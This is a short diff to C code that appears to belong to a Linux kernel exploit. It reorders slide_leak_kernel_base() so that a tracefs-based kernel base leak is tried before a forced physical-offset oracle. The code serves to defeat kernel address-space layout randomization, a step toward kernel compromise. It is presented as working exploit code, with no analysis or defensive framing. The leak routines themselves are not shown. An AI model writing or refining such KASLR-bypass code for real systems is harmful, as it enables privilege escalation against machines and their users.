@@ -1561,6 +1561,10 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
 int slide_leak_kernel_base_tracefs(void);
 
 int slide_leak_kernel_base(void) {
+  if (slide_leak_kernel_base_tracefs()) {
+    return 1;
+  }
+
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
   if (forced_offset_arg && *forced_offset_arg) {
@@ -1628,10 +1632,6 @@ int slide_leak_kernel_base(void) {
     pr_info("slide forced p0 offset=%08zx\n", forced_offset);
     return slide_commit_stext(
         KIMAGE_TEXT_BASE + forced_offset, "forced");
-  }
-
-  if (slide_leak_kernel_base_tracefs()) {
-    return 1;
   }
 
   uint64_t existing_stext = slide_read_stext();
